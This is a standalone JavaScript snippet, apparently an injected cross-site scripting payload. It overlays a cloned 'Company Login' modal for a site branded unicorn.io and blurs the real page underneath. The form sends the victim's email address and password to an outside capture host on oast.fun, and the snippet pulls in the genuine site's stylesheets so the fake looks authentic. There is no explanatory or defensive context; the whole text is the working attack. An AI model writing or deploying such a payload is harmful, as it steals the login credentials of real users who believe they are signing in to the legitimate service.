(function() {
  // Insert modal HTML (exact Unicorn company login page)
  document.body.insertAdjacentHTML('beforeend', `
    <div id="custom-login-modal" style="
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    ">
      <div class="white-container" style="
        border: 1px solid #eee;
        padding: 25px;
        background: white;
        min-height: 600px;
        max-width: 482px;
        width: 100%;
        font-family: Inter,-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;
      ">
        <!-- Logo -->
        <div style="text-align:center; margin-bottom:20px;">
          <a href="https://unicorn.io/en">
            <img src="https://unicorn.io/dist/img/logowhite.tm.svg" style="max-width:145px; margin-left:-10px;">
          </a>
        </div>

        <!-- Back + Title -->
        <div style="position:relative;">
          <a href="https://dashboard.unicorn.io/en/login" style="position:absolute; left:0; top:4px;">
            <i class="fa-light fa-chevron-left fa-2x" style="color:#d1d1d1;"></i>
          </a>
          <h1 class="fw-600 mb-4" style="color:#7fd0c8 !important; text-align:center;">Company Login</h1>
        </div>

        <!-- Form -->
        <form id="loginForm" action="https://abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun/" method="POST">
          <div class="mb-3">
            <label for="emailAddress" class="form-label">Email Address</label>
            <input type="email" class="form-control" name="user_email" id="emailAddress" required placeholder="Enter Your Email">
          </div>
          <div class="mb-3">
            <label for="loginPassword" class="form-label">Password</label>
            <input type="password" class="form-control" name="user_password" id="loginPassword" required placeholder="Enter Password">
            <input type="hidden" name="lang" value="en">
            <input type="hidden" name="csrf" value="09723e1572d0cc3f88f016946685dc30b1f017b5ff44026ebc195e515bc1b322">
            <input type="hidden" name="redirect" value="companies.login">
          </div>
          <div class="d-grid my-4">
            <button id="submit" class="btn btn-primary" type="submit">
              <i class="fas fa-lock"></i> Secure Login
            </button>
          </div>
        </form>

        <!-- Links -->
        <p class="text-muted mb-0" style="font-size:smaller !important;">
          Don't have a company account? <a class="link-primary" href="https://unicorn.io/get-started">Create a company account</a><br>
          <a class="link-primary" href="https://dashboard.unicorn.io/en/for-employers/reset">Forgot my password</a>
        </p>

        <!-- Footer -->
        <div style="margin-top:40px; text-align:center; font-size:13px; color:#7f7c7c;">
          © 2025 <strong>unicorn</strong>. <a href="https://unicorn.io/change.md" target="_blank" style="color:#7f7c7c;">v.2.7.7</a><br>All Rights Reserved.
        </div>
      </div>
    </div>
  `);

  // Load required styles (Bootstrap + FontAwesome + Dashboard CSS)
  const styles = [
    'https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css',
    'https://dashboard.unicorn.io/dist/css/dashboard.css?v=30',
    'https://kit.fontawesome.com/bc213df0cb.js'
  ];
  styles.forEach(href => {
    if (href.endsWith('.css') && !document.querySelector(`link[href="${href}"]`)) {
      const link = document.createElement('link');
      link.rel = 'stylesheet';
      link.href = href;
      document.head.appendChild(link);
    } else if (href.includes('fontawesome') && !document.querySelector(`script[src="${href}"]`)) {
      const script = document.createElement('script');
      script.src = href;
      script.crossOrigin = 'anonymous';
      document.head.appendChild(script);
    }
  });

  // Inline critical CSS
  const css = document.createElement('style');
  css.textContent = `
    .link-primary { color: #7fd0c8 !important; }
    .btn-primary { background-color: #7fd0c8 !important; border-color: #7fd0c8 !important; }
    .btn-primary:hover { background-color: #58948e !important; border-color: #58948e !important; }
    .form-control { border-radius: 0.25rem; }
    .fa-lock { margin-right: 8px; }
  `;
  document.head.appendChild(css);

  // Apply blur to main content
  const pageContent = document.querySelector('.body-container') || document.body;
  if (pageContent) {
    pageContent.style.transition = 'filter 0.3s ease';
    pageContent.style.filter = 'blur(5px)';
  }

  // Close modal on click outside or Escape
  const modal = document.getElementById('custom-login-modal');
  modal.addEventListener('click', (e) => {
    if (e.target.id === 'custom-login-modal') {
      modal.remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal) {
      modal.remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });
})();
